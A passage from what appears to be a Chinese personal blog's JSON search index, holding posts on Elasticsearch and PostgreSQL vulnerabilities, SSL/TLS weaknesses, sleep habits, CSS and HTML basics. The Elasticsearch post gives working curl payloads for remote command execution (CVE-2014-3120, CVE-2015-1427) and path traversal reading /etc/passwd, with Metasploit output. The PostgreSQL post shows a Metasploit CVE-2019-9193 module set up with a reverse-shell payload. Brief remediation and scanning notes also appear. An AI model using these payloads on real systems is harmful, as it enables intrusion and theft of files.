\u0026#34;AXY97qwJP4DeVVFFFPWX\u0026#34;, \u0026#34;_score\u0026#34; : 1.0, \u0026#34;fields\u0026#34; : { \u0026#34;lupin\u0026#34; : [ 666 ] } } ] } }   ElasticSearch 命令执行漏洞CVE-2014-3120 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  curl -X POST \u0026#34;http://10.200.88.6:9201/_search?pretty\u0026#34; -d \u0026#39;{ \u0026#34;size\u0026#34;: 1, \u0026#34;query\u0026#34;: { \u0026#34;filtered\u0026#34;: { \u0026#34;query\u0026#34;: { \u0026#34;match_all\u0026#34;: { } } } }, \u0026#34;script_fields\u0026#34;: { \u0026#34;command\u0026#34;: { \u0026#34;script\u0026#34;: \u0026#34;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\\u0026#34;id\\\u0026#34;).getInputStream()).useDelimiter(\\\u0026#34;\\\\\\\\A\\\u0026#34;).next();\u0026#34; } } }\u0026#39;   ElasticSearch Groovy 沙盒绕过 \u0026amp;\u0026amp; 代码执行漏洞CVE-2015-1427 1 2 3 4 5 6 7 8 9  curl -X POST \u0026#34;http://10.200.88.6:9201/_search?pretty\u0026#34; -d \u0026#39;{ \u0026#34;size\u0026#34;:1, \u0026#34;script_fields\u0026#34;:{ \u0026#34;lupin\u0026#34;:{ \u0026#34;lang\u0026#34;:\u0026#34;groovy\u0026#34;, \u0026#34;script\u0026#34;:\u0026#34;java.lang.Math.class.forName(\\\u0026#34;java.lang.Runtime\\\u0026#34;).getRuntime().exec(\\\u0026#34;id\\\u0026#34;).getText()\u0026#34; } } }\u0026#39;   ElasticSearch 目录穿越漏洞CVE-2015-3337 1  curl -X GET \u0026#34;http://10.200.88.6:9201/_plugin/head/../../../../../../../../../etc/passwd\u0026#34; -v   ElasticSearch 目录穿越漏洞CVE-2015-5531 MSF模块利用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  Module options (auxiliary/scanner/http/elasticsearch_traversal): Name Current Setting Required Description ---- --------------- -------- ----------- DEPTH 7 yes Traversal depth FILEPATH /etc/passwd yes The path to the file to read Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 192.168.108.223 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 9200 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections THREADS 1 yes The number of concurrent threads (max one per host) VHOST no HTTP server virtual host 192.168.108.223:default auxiliary(scanner/http/elasticsearch_traversal) \u0026gt; run [*] The target appears to be vulnerable. [+] File saved in: /Users/ethan/.msf4/loot/20210107091740_default_192.168.108.223_elasticsearch.tr_989389.txt [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed 192.168.108.223:default auxiliary(scanner/http/elasticsearch_traversal) \u0026gt; cat /Users/ethan/.msf4/loot/20210107091740_default_192.168.108.223_elasticsearch.tr_989389.txt [*] exec: cat /Users/ethan/.msf4/loot/20210107091740_default_192.168.108.223_elasticsearch.tr_989389.txt root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/usr/sbin/nologin man❌6:12:man:/var/cache/man:/usr/sbin/nologin   curl利用  新建一个仓库  1 2 3 4 5 6 7  curl -X POST \u0026#34;http://192.168.79.28:9200/_snapshot/test\u0026#34; -d \u0026#39;{ \u0026#34;type\u0026#34;: \u0026#34;fs\u0026#34;, \u0026#34;settings\u0026#34;: { \u0026#34;location\u0026#34;: \u0026#34;/usr/share/elasticsearch/repo/test\u0026#34; } }\u0026#39; {\u0026#34;acknowledged\u0026#34;:true}   创建一个快照  1 2 3 4 5 6 7  curl -X POST \u0026#34;http://192.168.79.28:9200/_snapshot/test2\u0026#34; -d \u0026#39;{ \u0026#34;type\u0026#34;: \u0026#34;fs\u0026#34;, \u0026#34;settings\u0026#34;: { \u0026#34;location\u0026#34;: \u0026#34;/usr/share/elasticsearch/repo/test/snapshot-backdata\u0026#34; } }\u0026#39; {\u0026#34;acknowledged\u0026#34;:true}   目录穿越读取任意文件  POC\n\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  curl -X GET \u0026#34;http://192.168.79.28:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpa sswd\u0026#34; {\u0026#34;error\u0026#34;:\u0026#34;ElasticsearchParseException[Failed to derive xcontent from (offset=0, length=919): [114, 111, 111, 1 16, 58, 120, 58, 48, 58, 48, 58, 114, 111, 111, 116, 58, 47, 114, 111, 111, 116, 58, 47, 98, 105, 110, 47, 98, 97, 115, 104, 10, 100, 97, 101, 109, 111, 110, 58, 120, 58, 49, 58, 49, 58, 100, 97, 101, 109, 111, 110, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111 , 103, 105, 110, 10, 98, 105, 110, 58, 120, 58, 50, 58, 50, 58, 98, 105, 110, 58, 47, 98, 105, 110, 58, 47, 11 7, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 115, 121, 115, 58, 120, 58, 51, 58, 51, 58, 115, 121, 115, 58, 47, 100, 101, 118, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 115, 121, 110, 99, 58, 120, 58, 52, 58, 54, 53, 53, 51, 52, 58, 115, 121, 110, 9 9, 58, 47, 98, 105, 110, 58, 47, 98, 105, 110, 47, 115, 121, 110, 99, 10, 103, 97, 109, 101, 115, 58, 120, 58, 53, 58, 54, 48, 58, 103, 97, 109, 101, 115, 58, 47, 117, 115, 114, 47, 103, 97, 109, 101, 115, 58, 47, 117, 1 15, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 109, 97, 110, 58, 120, 58, 54, 58, 49, 50, 58, 109, 97, 110, 58, 47, 118, 97, 114, 47, 99, 97, 99, 104, 101, 47, 109, 97, 110, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 108, 112, 58, 120, 58, 55, 58, 55, 58, 108, 112, 58, 47, 118, 97, 114, 47, 115, 112, 111, 111, 108, 47, 108, 112, 100, 58, 47, 117, 115, 114, 47, 115 , 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 109, 97, 105, 108, 58, 120, 58, 56, 58, 56, 58, 109 , 97, 105, 108, 58, 47, 118, 97, 114, 47, 109, 97, 105, 108, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 110, 101, 119, 115, 58, 120, 58, 57, 58, 57, 58, 110, 101, 119, 115, 5 8, 47, 118, 97, 114, 47, 115, 112, 111, 111, 108, 47, 110, 101, 119, 115, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 117, 117, 99, 112, 58, 120, 58, 49, 48, 58, 49, 48, 58, 1 17, 117, 99, 112, 58, 47, 118, 97, 114, 47, 115, 112, 111, 111, 108, 47, 117, 117, 99, 112, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 112, 114, 111, 120, 121, 58, 120, 58, 4 9, 51, 58, 49, 51, 58, 112, 114, 111, 120, 121, 58, 47, 98, 105, 110, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 119, 119, 119, 45, 100, 97, 116, 97, 58, 120, 58, 51, 51, 58, 51, 51, 58, 119, 119, 119, 45, 100, 97, 116, 97, 58, 47, 118, 97, 114, 47, 119, 119, 119, 58, 47, 117, 115, 1 14, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 98, 97, 99, 107, 117, 112, 58, 120, 58, 51, 52, 58, 51, 52, 58, 98, 97, 99, 107, 117, 112, 58, 47, 118, 97, 114, 47, 98, 97, 99, 107, 117, 112, 115, 5 8, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 108, 105, 115, 116, 58, 120, 58, 51, 56, 58, 51, 56, 58, 77, 97, 105, 108, 105, 110, 103, 32, 76, 105, 115, 116, 32, 77, 97, 110, 97, 103, 101, 114, 58, 47, 118, 97, 114, 47, 108, 105, 115, 116, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 105, 114, 99, 58, 120, 58, 51, 57, 58, 51, 57, 58, 105, 114, 99, 100, 58, 47, 118, 97, 114, 47, 114, 117, 110, 47, 105, 114, 99, 100, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 103, 110, 97, 116, 115, 58, 120, 58, 52, 49, 58, 52, 49, 58, 71, 110, 97, 116, 115, 32, 66, 117, 103, 45, 82, 101, 112, 111, 114, 116, 105, 110, 103, 32, 83, 121, 115, 116, 101, 109, 32, 40, 97, 100, 109, 105, 110, 41, 58, 47, 118, 97, 114, 47, 108, 105, 98, 47, 103, 110, 97, 116, 115, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 110, 111, 98, 111, 100, 121, 58, 120, 58, 54, 53, 53, 51, 52, 58, 54, 53, 53, 51, 52, 58, 110, 111, 98, 111, 100, 121, 58, 47, 110, 111, 110, 101, 120, 105, 115, 116, 101, 110, 116, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 47, 110, 111, 108, 111, 103, 105, 110, 10, 95, 97, 112, 116, 58, 120, 58, 49, 48, 48, 58, 54, 53, 53, 51, 52, 58, 58, 47, 110, 111, 110, 101, 120, 105, 115, 116, 101, 110, 116, 58, 47, 98, 105, 110, 47, 102, 97, 108, 115, 101, 10]]\u0026#34;,\u0026#34;status\u0026#34;:400}   对十进制整数进行解码即可\n解码平台\nSolution  限制IP访问，绑定固定IP 在config/elasticsearch.yml中为9200端口设置认证：  1 2 3 4  http.basic.enabled true #开关，开启会接管全部HTTP连接 http.basic.user \u0026#34;admin\u0026#34; #账号 http.basic.password \u0026#34;admin_pw\u0026#34; #密码 http.basic.ipwhitelist [\u0026#34;localhost\u0026#34;, \u0026#34;127.0.0.1\u0026#34;]   ","description":"","id":81,"section":"en","tags":null,"title":"Elasticsearch","uri":"http://crkmythical.github.io/en/blog/elasticsearch/"},{"content":"编写进度\n   高质量睡眠三要素 坚持练习\n消除脑疲劳 体征：\n头皮紧绷、帽子变紧\n包括视疲劳,\n眼睛是\u0026quot;裸露在外的大脑，视疲劳就是大脑的疲劳\u0026quot;\n操作：\n 用蒸汽抱紧热敷眼睛和后脑勺\n 改善血液循环 增强锻炼，改善体态。\n操作\n 6个标准深蹲,坚持，坚持，坚持\n 调整睡眠环境 卧室其他因素\n 床 板条床 枕 填补脖子和肩膀之间的区域 灯光 微光 气味 清淡 温度 22-26 卫生 整洁  ","description":"","id":82,"section":"en","tags":[""],"title":"sleep","uri":"http://crkmythical.github.io/en/blog/sleep/"},{"content":"编写进度\n   TLSv1.0检测与修复 TLS 1.0于1999年发行，该版本易受各种攻击（如BEAST和POODLE）已有多年，除此之外，支持较弱加密，对当今网络连接的安全已失去应有的保护效力。\n检测  nmap检测  1  nmap --script ssl-enum-ciphers -p 443 www.target.com    在线检测\nssl协议与套件检测  修复  Apache  1 2  sed -i \u0026#34;s/^SSLProtocol.*/SSLProtocol all -SSLv1 -SSLv2 -SSLv3/g\u0026#34; /etc/httpd/conf.d/ssl.conf systemctl restart httpd    Nginx  1 2  sed -i \u0026#34;s/^ssl_protocols.*/ssl_protocols TLSv1.2 TLSv1.3;/g\u0026#34; /etc/nginx/nginx.conf /usr/nginx/sbin/nginx -s reload   SWEET32攻击 CVE-201602183 使用64位块大小如3DES的传统分组密码当以CBC（密码分组链接）模式使用时易遭受碰撞攻击。当使用CBC模式时，简单的生日攻击就能识别出64位分组密码碰撞。当碰撞发生时意味着输入和输出是一样的，这样就可能发动BEAST方式的攻击提取加密数据。\n1 2 3 4 5 6 7 8  ./testssl.sh -W https://10.199.27.2 Testing for SWEET32 (Birthday Attacks on 64-bit Block Ciphers) SWEET32 (CVE-2016-2183, CVE-2016-6329) VULNERABLE,uses 64 bit block ciphers nmap -sV --script ssl-enum-ciphers -p 443 10.199.27.1   solutions 参考链接：\nCVE-2016-2183\n HTTPD   /etc/httpd/conf.d/ssl.conf\n 1  SSLCipherSuite HIGH:!aNULL:!MD5:!3DES;   -Nginx\n /usr/local/etc/nginx/nginx.conf\n 1  ssl_ciphers HIGH:!aNULL:!MD5:!3DES;   Logjam攻击 CVE-2015-4000 Logjam漏洞可帮助攻击者(中间人)将TLS连接降级为512位导出级加密。这有助于攻击者读取和修改通过网络连接传输的任何数据。\n1 2 3 4 5 6  ./testssl -J https://10.199.27.1 Testing for LOGJAM vulnerability LOGJAM (CVE-2015-4000), experimental VULNERABLE (NOT ok): common prime: RFC2409/Oakley Group 2 (1024 bits), but no DH EXPORT ciphers   Solutions  /etc/httpd/conf.d/ssl.conf\n  HTTPD  1  SSLCipherSuite !EXPORT    /usr/local/etc/nginx/nginx.conf\n  Nginx  1 2 3  ssl_ciphers \u0026#39;!EXPORT\u0026#39;; ssl_ciphers ALL:!aNULL:!EXPORT56:+RSA:+HIGH:+MEDIUM:+LOW:+SSLv2:+EXP:!RC4:!MD5:!3DES!:SSLv3; # 或者这个 #Note: - If you already have ssl_ciphers configured, you just need to add !EXPORT in existing line instead of adding new one.   ","description":"","id":83,"section":"en","tags":null,"title":"SSLTLS相关漏洞","uri":"http://crkmythical.github.io/en/blog/ssltls%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E/"},{"content":"编写进度\n   PostgreSQL 是目前功能最强大、特性最丰富和结构最复杂的开源数据库管理系统，是主流数据库中最符合SQL标准规范的实现。\nPostgreSQL 的性能非常优秀，并且在极限压力的情况下依旧能保持稳定的性能。\nInformation 1 2 3 4 5 6  nmap -Pn -sV -p5432 10.199.39.1 Host is up (0.057s latency). PORT STATE SERVICE VERSION 5432/tcp open postgresql PostgreSQL DB 9.3.0 - 9.3.2 Nmap done: 1 IP address (1 host up) scanned in 7.06 seconds   PostgreSQL任意代码执行 CVE-2019-9193 存在版本：PostgreSQL\u0026gt; = 9.3\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  Module options (exploit/multi/postgres/postgres_copy_from_program_cmd_exec): Name Current Setting Required Description ---- --------------- -------- ----------- DATABASE template1 yes The database to authenticate against DUMP_TABLE_OUTPUT false no select payload command output from table (For Debugging) PASSWORD postgres no The password for the specified username. Leave blank for a random password. RHOSTS 10.199.39.1 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 5432 yes The target port (TCP) TABLENAME YpVFJRRcUZ yes A table name that does not exist (To avoid deletion) USERNAME postgres yes The username to authenticate as Payload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.79.28 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port   ","description":"","id":84,"section":"en","tags":null,"title":"PostgreSQL","uri":"http://crkmythical.github.io/en/blog/postgresql/"},{"content":"编写进度\n [x]  CSS(Cascading Style Sheet) 层叠样式表,是一种用来为结构化文档（如 HTML 文档或 XML 应用）添加样式（字体、间距和颜色等）的计算机语言。\nW3School TIY Editor\nCSS引入方式\n1  \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;path/to/xx.css\u0026#34; /\u0026gt;   CSS规则：\n1 2 3 4 5  selector { style_name1: value1; style_name2: value2; ... }   CSS基本样式 四种基础选择器\n 派生选择器 通过依据元素在其位置的上下文关系来定义样式，可以使标记更加简洁  1 2 3 4  li strong { font-style: italic; font-weight: normal; }    id选择器 id 选择器可以为标有特定 id 的 HTML 元素指定特定的样式。以 “#” 来定义  1 2 3  #pid { color: #00755f; }    类选择器 类可以为特定class属性的HTML元素指定特定的样式，以一个点号(.)定义  1 2 3  .divclass { color: red; }    属性选择器 对带有指定属性的 HTML 元素设置样式。  1 2 3 4  [title] { color:red; }   背景 重要属性\n   属性 描述     background-attachment 背景图像是否固定或者随着页面的其余部分滚动   background-color 设置元素的背景颜色   background-image 把图片设置为背景   background-position 设置背景图片的起始位置   background-repeat 设置背景图片是否及如何重复    CSS3 背景\n   属性 描述     background-size 规定背景图片的尺寸   background-origin 规定背景图片的定位区域   background-clip 规定背景的绘制区域    1 2 3 4 5  /* 把python.png设置为背景图片，但是不平铺 */ body { background-image: url(\u0026#34;python.png\u0026#34;); background-repeat: no-repeat; }   文本 重要属性\n   属性 描述     color 文本颜色   direction 文本方向   line-height 行高   letter-spacing 字符间距   text-align 对齐元素中的文本   text-decoration 向文本添加修饰   text-indent 缩进元素中文本的首行   text-transform 元素中的字母   unicode-bidi 设置文本方向   white-space 元素中空白的处理方式   word-spacing 字间距    链接 CSS链接的四种状态\n a:link –普通的、未被访问的链接 a:visited –用户已访问的链接 a:hover –鼠标指针位于链接的上方 a:active –链接被点击的时刻  注意事项\n a:hover必须位于a:link和a:visited之后 a:active必须位于a:hover之后  1 2 3 4  a:link {color:#FF0000;}\t/* 未被访问的链接 */ a:visited {color:#00FF00;}\t/* 已被访问的链接 */ a:hover {color:#FF00FF;}\t/* 鼠标指针移动到链接上 */ a:active {color:#0000FF;}\t/* 正在被点击的链接 */   列表    属性 描述     list-style 简写属性。用于把所有用于列表的属性设置于一个声明中。   list-style-image 将图象设置为列表项标志。   list-style-position 设置列表中列表项标志的位置。   list-style-type 设置列表项标志的类型。   marker-offset     1 2 3  ul li { list-style-image : url(xxx.gif) }   表格    属性 描述     border-collapse 设置是否把表格边框合并为单一的边框。   border-spacing 设置分隔单元格边框的距离。   caption-side 设置表格标题的位置。   empty-cells 设置是否显示表格中的空单元格。   table-layout 设置显示单元、行和列的算法。    1 2 3 4  table, th, td { border: 1px solid blue; }   轮廓    属性 描述 CSS     outline 在一个声明中设置所有的轮廓属性。 2   outline-color 设置轮廓的颜色。 2   outline-style 设置轮廓的样式。 2   outline-width 设置轮廓的宽度。 2    1 2 3 4 5  #p1 { outline-color: #ff704d; outline-style: groove; outline-width: 10px; }   CSS盒子模型 内边距padding 内边距\n padding属性定义元素边框与元素内容之间的空白区域 padding属性接受长度值或百分比值，但不允许使用负值 按照上、右、下、左的顺序分别设置各边的内边距  内边距的四个属性\n padding-top padding-right padding-bottom padding-left  1 2 3 4 5 6 7  h1 { padding-top: 10px; padding-right: 0.25em; padding-bottom: 2ex; padding-left: 20%; }   边框border 边框\n 元素的边框(border)是围绕元素内容和内边距的一条或多条线 设置border属性可以规定元素边框的样式、宽度和颜色  边框样式\n border-style设置样式  边框宽度\n border-width需要设置边框的宽度 border-top-width border-right-width border-bottom-width border-left-width  边框颜色\n border-color需要设置边框的颜色 border-top-color border-right-color border-bottom-color border-left-color  1 2 3 4 5 6 7 8 9 10 11  td { border-style: solid; border-width: 15px 5px 15px 5px; } border-style: dashed; border-top-width: 15px; border-right-width: 5px; border-bottom-width: 15px; border-left-width: 5px; border-color: blue rgb(25%, 35%, 45%) #909090 red;   外边距margin 外边距\n 外边距就是围绕在内容框的区域，默认为透明的区域 同样，外边距也接受任何长度的单位、百分数，与内边距很相似 margin的默认值是0，但是一般浏览器都会预定提供样式 对称复制  外边距的四个属性\n margin-top margin-right margin-bottom margin-left  1 2 3 4 5 6 7  h2 { margin-top: 20px; margin-right: 30px; margin-bottom: 30px; margin-left: 20px; }   外边距合并 外边距合并指的是，当两个垂直外边距相遇时，它们将形成一个外边距。合并后的外边距的高度等于两个发生合并的外边距的高度中的较大者。\n当一个元素出现在另一个元素上面时，第一个元素的下外边距与第二个元素的上外边距会发生合并。请看下图：\n当一个元素包含在另一个元素中时（假设没有内边距或边框把外边距分隔开），它们的上和/或下外边距也会发生合并。请看下图：\nCSS定位 定位的基本思想很简单，它允许你定义元素框相对于其正常位置应该出现的位置，或者相对于父元素、另一个元素甚至浏览器窗口本身的位置。\n定位机制 CSS 有三种基本的定位机制\n 普通流 元素按照其在HTML中的位置顺序决定排布的过程。 浮动 浮动的框可以向左或向右移动，直到它的外边缘碰到包含框或另一个浮动框的边框为止。 绝对定位: 绝对定位使元素的位置与文档流无关，因此不占据空间。这一点与相对定位不同，相对定位实际上被看作普通流定位模型的一部分，因为元素的位置相对于它在普通流中的位置。  定位属性\n position，将元素放在一个静态的、相对的、绝对的或固定的位置 通过对 top,left,right,bottom 这四个属性的赋值让元素向对应的方向偏移 overflow设置元素溢出其区域发生的事情 clip 设置元素的显示形状，多用于图片 vertical-align设置元素的垂直对其方式 z-index设置元素的堆叠顺序  相对定位 设置为相对定位的元素框会偏移某个距离。元素仍然保持其未定位前的形状，它原本所占的空间仍保留。\n1 2 3 4 5  #box_relative { position: relative; left: 30px; top: 20px; }   绝对定位 设置为绝对定位的元素框从文档流完全删除，并相对于其包含块定位，包含块可能是文档中的另一个元素或者是初始包含块。\n元素原先在正常文档流中所占的空间会关闭，就好像该元素原来不存在一样。 元素定位后生成一个块级框，而不论原来它在正常流中生成何种类型的框。\n1 2 3 4 5  #box_relative { position: absolute; left: 30px; top: 20px; }   浮动 浮动的框可以向左或向右移动，直到它的外边缘碰到包含框或另一个浮动框的边框为止。\n由于浮动框不在文档的普通流中，所以文档的普通流中的块框表现得就像浮动框不存在一样。\nfloat属性可以赋值如下\n left：元素向左浮动 right：元素向右浮动 none：不浮动 inherit：从父级继承浮动的属性 clear：主要用于去掉向各方向的浮  ","description":"","id":85,"section":"en","tags":null,"title":"css_basic","uri":"http://crkmythical.github.io/en/blog/css-basic/"},{"content":"编写进度\n   HTML(Hyper Text Markup Language) 是一种用来制作超文本文件的简单标记语言，用HTML编写的超文本文件成为html文件，它能独立于各种操作系统平台。\nW3School TIY Editor\n1 2 3 4 5 6 7 8  \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!--头部信息--\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!--文件主题---\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   层标签 1 2 3  \u0026lt;div id=\u0026#34;\u0026#34; align=\u0026#34;\u0026#34; style=\u0026#34;\u0026#34; class=\u0026#34;\u0026#34;\u0026gt; ... \u0026lt;/div\u0026gt;   文本样式 标题与段落 1 2 3 4 5  \u0026lt;h1\u0026gt;Typography\u0026lt;/h1\u0026gt; \u0026lt;h2\u0026gt;History\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;Thomas identified the victim only as a 32-year-old woman.\u0026lt;/p\u0026gt; \u0026lt;br /\u0026gt; \u0026lt;!-- 换行---\u0026gt; \u0026lt;hr /\u0026gt;\u0026lt;!-- 水平分割线\u0026gt;   链接 超链接 href的写法\n1 2 3 4 5 6 7 8 9  \u0026lt;a href=\u0026#34;http://www.w3.org/index.html\u0026#34;\u0026gt;W3C\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;//www.w3.org/index.html\u0026#34;\u0026gt;W3C\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;mailto:askding@qq.com?Subject=我有疑问\u0026#34;\u0026gt;W3C\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;ftp://ftp.pku.edu.cn\u0026#34;\u0026gt;跳转到FTP\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;telnet://10.1.1.1\u0026#34;\u0026gt;Telnet到10.1.1.1\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;a/b/c.html\u0026#34;\u0026gt;相对路径\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;../../c.html\u0026#34;\u0026gt;相对路径\u0026lt;/a\u0026gt;   页面内锚点\n1 2  \u0026lt;p id=\u0026#34;test\u0026#34;\u0026gt;test\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;a href=\u0026#34;#test\u0026#34;\u0026gt;回到test\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt;   链接目标target的写法\n1 2  \u0026lt;a href=\u0026#34;http://www.w3.org\u0026#34; target=\u0026#34;_self\u0026#34;\u0026gt;W3C(当前窗口打开)\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;http://www.w3.org\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;W3C(新建窗口打开)\u0026lt;/a\u0026gt;   图片链接 1  \u0026lt;img src=\u0026#34;/path/to/img.jpg\u0026#34; alt=\u0026#34;替代文字\u0026#34; /\u0026gt;   多媒体 动态文字 1 2 3 4 5 6 7 8 9  \u0026lt;marquee direction=\u0026#34;left/right/up/down\u0026#34; behavior=\u0026#34;scroll/slide/alternate\u0026#34; loop=1 scrollamount=5 scrolldelay=1 bgcolor=“#FFFF55” width=300 height=500\u0026gt; 动态文字. \u0026lt;/marquee\u0026gt; direction: 滚动方向 behavior: 滚动方式 loop: 循环次数 scrollamount: 滚动速度 scrolldelay: 滚动延迟 bgcolor: 背景颜色 width、height:滚动面积   Audio标签 1  \u0026lt;audio src=\u0026#34;path/to/audio_file\u0026#34; autoplay=\u0026#34;\u0026#34; controls=\u0026#34;\u0026#34; loop=1\u0026#34; \u0026gt;您的浏览器不支持audio标记\u0026lt;/audio\u0026gt;   Video标签 1 2  \u0026lt;video src=\u0026#34;path/to/video_file\u0026#34; autoplay=\u0026#34;\u0026#34; width=10 height=10 loop=1 \u0026gt;您的浏览器不支持video标记\u0026lt;/video\u0026gt;   字幕标签 1  \u0026lt;track src=\u0026#34;vat/sintel-en.vtt\u0026#34; srclang=\u0026#34;en\u0026#34;. kind=\u0026#34;captions\u0026#34; label=\u0026#34;English captions\u0026#34; /\u0026gt;   多媒体文件 1 2  \u0026lt;embed src=\u0026#34;/path/to/file\u0026#34; autostart=True/False loop=3 hidden=True/False width=300 height=400\u0026gt;\u0026lt;/embed\u0026gt;   背景音乐 1  \u0026lt;bgsound src=\u0026#34;/path/to/music.mp3\u0026#34; loop= 1\u0026gt;   列表 定义列表 1 2 3 4  \u0026lt;dl\u0026gt; \u0026lt;dt\u0026gt;名词1\u0026lt;dd\u0026gt;解释名词1 \u0026lt;dt\u0026gt;名词2\u0026lt;dd\u0026gt;解释名词2 \u0026lt;/dl\u0026gt;   无序列表 1 2 3 4 5 6  \u0026lt;ul type=\u0026#34;disc/circle/square\u0026#34;\u0026gt; \u0026lt;LI\u0026gt;列表项 \u0026lt;LI\u0026gt;列表项 \u0026lt;LI\u0026gt;列表项 \u0026lt;/ul\u0026gt;   有序列表 1 2 3 4 5 6 7  \u0026lt;ol type=1/a/A/i/I start=1 \u0026gt; \u0026lt;LI\u0026gt;列表项 \u0026lt;LI\u0026gt;列表项 \u0026lt;LI\u0026gt;列表项 \u0026lt;/ol\u0026gt;   菜单列表 1 2 3 4 5 6  \u0026lt;menu\u0026gt; \u0026lt;LI\u0026gt;菜单项 \u0026lt;LI\u0026gt;菜单项 \u0026lt;LI\u0026gt;菜单项 \u0026lt;LI\u0026gt;菜单项 \u0026lt;/menu\u0026gt;   目录列表 1 2 3 4 5 6 7  \u0026lt;dir\u0026gt; \u0026lt;LI\u0026gt;文件名 \u0026lt;LI\u0026gt;文件名 \u0026lt;LI\u0026gt;文件名 \u0026lt;LI\u0026gt;文件名 \u0026lt;/dir\u0026gt;   表格 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  \u0026lt;table width=300 height=300 align=\u0026#34;left/center/right\u0026#34; border=1 bordercolor=\u0026#34;#FFFF55\u0026#34;\u0026gt; \u0026lt;caption\u0026gt;表格标题\u0026lt;/caption\u0026gt; \u0026lt;thead bgcolor align \u0026gt; \u0026lt;!--可选---\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;!--第一行---\u0026gt; \u0026lt;th\u0026gt;表头1\u0026lt;/th\u0026gt; \u0026lt;!--第一列---\u0026gt; \u0026lt;th\u0026gt;表头2\u0026lt;/th\u0026gt; \u0026lt;!--第二列---\u0026gt; \u0026lt;th\u0026gt;表头3\u0026lt;/th\u0026gt; \u0026lt;!--第三列---\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;thead\u0026gt; \u0026lt;tbody bicolor=\u0026#34;\u0026#34; aligin=\u0026#34;\u0026#34;\u0026gt; \u0026lt;!--可选---\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;!--第一行---\u0026gt; \u0026lt;td\u0026gt;单元格内的文字\u0026lt;/td\u0026gt; \u0026lt;!--第一列---\u0026gt; \u0026lt;td\u0026gt;单元格内的文字\u0026lt;/td\u0026gt; \u0026lt;!--第二列---\u0026gt; \u0026lt;td\u0026gt;单元格内的文字\u0026lt;/td\u0026gt; \u0026lt;!--第三列---\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;!--第二行---\u0026gt; \u0026lt;td\u0026gt;单元格内的文字\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;单元格内的文字\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;单元格内的文字\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tbody\u0026gt; \u0026lt;tfoot bgcolor=\u0026#34;\u0026#34; 